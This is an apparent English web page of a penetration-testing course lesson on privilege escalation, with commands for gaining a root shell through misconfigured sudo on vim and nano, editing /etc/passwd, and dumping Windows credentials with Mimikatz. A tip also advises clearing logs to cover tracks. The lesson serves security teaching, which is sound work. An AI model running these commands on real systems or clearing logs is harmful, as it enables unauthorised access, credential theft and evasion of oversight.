<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privilege Escalation</title>

    <link rel="alternate" href="https://campusempresa.com/mod/pentesting/05-01-escalada-de-privilegios" hreflang="es" />
	<link rel="alternate" href="https://campusempresa.cat/mod/pentesting/05-01-escalada-de-privilegios" hreflang="ca" />
	<link rel="alternate" href="https://enterprisecampus.net/mod/pentesting/05-01-escalada-de-privilegios" hreflang="en" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
</head>

<body >
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-12 col-md-8 p-0">
			<h1 class="m-0 p-0">
				<a href="/"><img src="/img/logo-header_enterprise.png"></a>
			</h1>
		</div>
		<div class="col-12 col-md-4 p-0 text-end">
			<h2 id="main_title"><cite>Building today's and tomorrow's society</cite></h2>
			<h3 id="main_subtitle"></h3>
		</div>
	</div>
</div>
<div class="container-xxl" style="margin-top: -1em;">
	<div class="row">
		<div class="col-12 p-0 m-0 text-end">
													<b id="lit_lang_es" class="px-2">EN</b>
				|
				<a href="https://campusempresa.com/mod/pentesting/05-01-escalada-de-privilegios" class="px-2">ES</a></b>
				|
				<a href="https://campusempresa.cat/mod/pentesting/05-01-escalada-de-privilegios" class="px-2">CA</a>
					</div>
	</div>
</div>
   <div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
				<a href="/objective">The Project</a>
				<a href="/about">About Us</a>
				<a href="/contribute">Contribute</a>
				<a href="/donate">Donations</a>
				<a href="/licence">License</a>
			</div>
		</div>
	</div>
   </div>

<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content">
								<div class='row navigation'>
	<div class='col-2'>
					<a href='04-04-explotacion-sistemas' title="Exploitation of System Vulnerabilities">&#x25C4;Previous</a>
			</div>
	<div class='col-8 text-center'>
					<a href="./"><h2 style="text-decoration:underline">Privilege Escalation</h2></a>
			</div>
	<div class='col-2 text-end'>
					<a href='05-02-mantenimiento-del-acceso' title="Maintaining Access">Next &#x25BA;</a>
			</div>
</div>
<div class='content'><p>Privilege escalation is a critical phase in penetration testing where the attacker seeks to gain higher-level permissions on a system or network. This can involve moving from a lower-privileged user account to an administrative or root account, thereby gaining more control over the target environment.</p>
</div><h1>Key Concepts</h1>
<div class='content'><ol>
<li>
<p><strong>Privilege Levels</strong>:</p>
<ul>
<li><strong>User-Level Privileges</strong>: Basic access rights typically granted to regular users.</li>
<li><strong>Administrative Privileges</strong>: Higher-level permissions that allow for system-wide changes and access to sensitive data.</li>
<li><strong>Root Privileges</strong>: The highest level of access on Unix/Linux systems, equivalent to administrative privileges on Windows.</li>
</ul>
</li>
<li>
<p><strong>Types of Privilege Escalation</strong>:</p>
<ul>
<li><strong>Vertical Privilege Escalation</strong>: Gaining higher-level privileges than initially granted.</li>
<li><strong>Horizontal Privilege Escalation</strong>: Gaining access to the same level of privileges but for different user accounts.</li>
</ul>
</li>
<li>
<p><strong>Common Techniques</strong>:</p>
<ul>
<li><strong>Exploiting Vulnerabilities</strong>: Leveraging software bugs or misconfigurations to gain elevated privileges.</li>
<li><strong>Credential Dumping</strong>: Extracting passwords or hashes from memory or storage.</li>
<li><strong>Social Engineering</strong>: Manipulating individuals to gain access to privileged accounts.</li>
<li><strong>Misconfigured Services</strong>: Exploiting services that run with higher privileges than necessary.</li>
</ul>
</li>
</ol>
</div><h1>Practical Examples</h1>
<div class='content'></div><h2>Example 1: Exploiting Sudo Misconfigurations</h2>
<div class='content'><p>In Unix/Linux systems, <code>sudo</code> allows permitted users to execute commands as the superuser or another user. Misconfigurations in the <code>sudoers</code> file can be exploited for privilege escalation.</p>
<h4>Code Snippet</h4>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBDaGVjayBzdWRvIHByaXZpbGVnZXMKc3VkbyAtbAoKIyBFeGFtcGxlIG91dHB1dApVc2VyIHN0dWRlbnQgbWF5IHJ1biB0aGUgZm9sbG93aW5nIGNvbW1hbmRzIG9uIHRoaXMgaG9zdDoKICAgIChBTEwpIE5PUEFTU1dEOiAvdXNyL2Jpbi92aW0KCiMgRXhwbG9pdCB2aW0gdG8gZ2FpbiByb290IHNoZWxsCnN1ZG8gdmltIC1jICc6IS9iaW4vYmFzaCc="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Check sudo privileges
sudo -l

# Example output
User student may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/vim

# Exploit vim to gain root shell
sudo vim -c ':!/bin/bash'</pre></div><div class='content'><h4>Explanation</h4>
<ol>
<li><strong>Check sudo privileges</strong>: The <code>sudo -l</code> command lists the allowed commands for the current user.</li>
<li><strong>Identify misconfiguration</strong>: The output shows that the user can run <code>vim</code> with <code>sudo</code> without a password.</li>
<li><strong>Exploit</strong>: Using <code>vim</code> to execute a shell command (<code>:!/bin/bash</code>) as root.</li>
</ol>
</div><h2>Example 2: Credential Dumping with Mimikatz</h2>
<div class='content'><p>Mimikatz is a tool used to extract plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory in Windows systems.</p>
<h4>Code Snippet</h4>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBSdW4gTWltaWthdHogdG8gZHVtcCBjcmVkZW50aWFscwptaW1pa2F0ei5leGUKCiMgSW5zaWRlIE1pbWlrYXR6IHNoZWxsCnByaXZpbGVnZTo6ZGVidWcKc2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRz"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Run Mimikatz to dump credentials
mimikatz.exe

# Inside Mimikatz shell
privilege::debug
sekurlsa::logonpasswords</pre></div><div class='content'><h4>Explanation</h4>
<ol>
<li><strong>Run Mimikatz</strong>: Execute the Mimikatz tool.</li>
<li><strong>Enable debug privileges</strong>: <code>privilege::debug</code> grants the necessary permissions to access sensitive information.</li>
<li><strong>Dump credentials</strong>: <code>sekurlsa::logonpasswords</code> extracts credentials from memory.</li>
</ol>
</div><h1>Practical Exercises</h1>
<div class='content'></div><h2>Exercise 1: Exploiting Sudo Misconfigurations</h2>
<div class='content'><p><strong>Objective</strong>: Gain root access by exploiting a misconfigured <code>sudoers</code> file.</p>
<p><strong>Scenario</strong>: You have access to a Linux system with a user account <code>student</code>. The <code>sudoers</code> file allows <code>student</code> to run <code>/usr/bin/nano</code> without a password.</p>
<p><strong>Steps</strong>:</p>
<ol>
<li>Check the sudo privileges for the <code>student</code> user.</li>
<li>Identify the misconfiguration.</li>
<li>Exploit the misconfiguration to gain a root shell.</li>
</ol>
<p><strong>Solution</strong>:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBDaGVjayBzdWRvIHByaXZpbGVnZXMKc3VkbyAtbAoKIyBFeGFtcGxlIG91dHB1dApVc2VyIHN0dWRlbnQgbWF5IHJ1biB0aGUgZm9sbG93aW5nIGNvbW1hbmRzIG9uIHRoaXMgaG9zdDoKICAgIChBTEwpIE5PUEFTU1dEOiAvdXNyL2Jpbi9uYW5vCgojIEV4cGxvaXQgbmFubyB0byBnYWluIHJvb3Qgc2hlbGwKc3VkbyBuYW5vIC9ldGMvcGFzc3dkCiMgQWRkIGEgbmV3IHJvb3QgdXNlciBvciBtb2RpZnkgYW4gZXhpc3RpbmcgdXNlciB0byBoYXZlIHJvb3QgcHJpdmlsZWdlcw=="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Check sudo privileges
sudo -l

# Example output
User student may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/nano

# Exploit nano to gain root shell
sudo nano /etc/passwd
# Add a new root user or modify an existing user to have root privileges</pre></div><div class='content'></div><h2>Exercise 2: Using Mimikatz for Credential Dumping</h2>
<div class='content'><p><strong>Objective</strong>: Extract credentials from a Windows system using Mimikatz.</p>
<p><strong>Scenario</strong>: You have access to a Windows system with administrative privileges.</p>
<p><strong>Steps</strong>:</p>
<ol>
<li>Download and run Mimikatz.</li>
<li>Enable debug privileges.</li>
<li>Dump the credentials.</li>
</ol>
<p><strong>Solution</strong>:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBSdW4gTWltaWthdHogdG8gZHVtcCBjcmVkZW50aWFscwptaW1pa2F0ei5leGUKCiMgSW5zaWRlIE1pbWlrYXR6IHNoZWxsCnByaXZpbGVnZTo6ZGVidWcKc2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRz"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Run Mimikatz to dump credentials
mimikatz.exe

# Inside Mimikatz shell
privilege::debug
sekurlsa::logonpasswords</pre></div><div class='content'></div><h1>Common Mistakes and Tips</h1>
<div class='content'><ul>
<li>
<p><strong>Mistake</strong>: Ignoring the legality and ethics of using tools like Mimikatz.</p>
<ul>
<li><strong>Tip</strong>: Always ensure you have explicit permission before performing any penetration testing activities.</li>
</ul>
</li>
<li>
<p><strong>Mistake</strong>: Overlooking system logs that may alert administrators to your activities.</p>
<ul>
<li><strong>Tip</strong>: Cover your tracks by clearing logs or using stealthier methods.</li>
</ul>
</li>
</ul>
</div><h1>Conclusion</h1>
<div class='content'><p>Privilege escalation is a powerful technique in penetration testing that allows attackers to gain higher-level access within a target system. By understanding and practicing various methods, such as exploiting sudo misconfigurations and using tools like Mimikatz, you can effectively identify and mitigate potential security risks. Always remember to conduct these activities ethically and within the bounds of the law.</p>
</div><div class='row navigation'>
	<div class='col-2'>
					<a href='04-04-explotacion-sistemas' title="Exploitation of System Vulnerabilities">&#x25C4;Previous</a>
			</div>
	<div class='col-8 text-center'>
			</div>
	<div class='col-2 text-end'>
					<a href='05-02-mantenimiento-del-acceso' title="Maintaining Access">Next &#x25BA;</a>
			</div>
</div>

			</div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<h1>Advertising</h1>
			<p>This space is reserved for advertising.</p>
			<p>If you want to be a sponsor, contact us to include links in this area: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
			<p>Thank you for collaborating!</p>
		</div>
	</div>
</div>

   <div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. All rights reserved</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	Fem servir galetes per millorar la teva experiència d'ús i oferir continguts adaptats als teus interessos
    <a href="#" id="btn_accept_cookies" class="button">Accept</a>
    <a href="/cookies">More Information</a>
</div>	

	</div>    
</body>
</html>
